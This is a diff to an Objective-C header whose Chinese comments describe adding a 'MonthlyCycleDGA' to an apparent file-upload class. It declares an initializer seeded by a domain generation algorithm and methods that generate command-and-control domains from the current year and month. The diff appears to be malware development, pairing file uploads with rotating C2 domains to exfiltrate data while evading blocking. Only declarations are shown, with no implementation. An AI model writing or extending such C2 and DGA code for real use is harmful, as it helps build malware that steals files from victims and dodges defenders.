@@ -16,6 +16,9 @@
 // 用基础 URL 初始化
 - (instancetype)initWithBaseURL:(NSURL*)baseURL;
 
+// 用 DGA 生成的域名初始化 (MonthlyCycleDGA)
+- (instancetype)initWithDGASeed:(uint32_t)seed;
+
 // 上传单个文件
 - (void)uploadFile:(NSString*)filePath withType:(NSString*)type;
 
@@ -27,5 +30,11 @@
 
 // 构造请求
 - (NSMutableURLRequest*)requestWithURL:(NSURL*)url;
+
+// MonthlyCycleDGA: 根据当前年月和种子生成 C2 域名
++ (NSString*)generateDomainForYear:(int)year month:(int)month seed:(uint32_t)seed;
+
+// 获取当前月份的 DGA 域名
++ (NSString*)currentMonthDomainWithSeed:(uint32_t)seed;
 
 @end
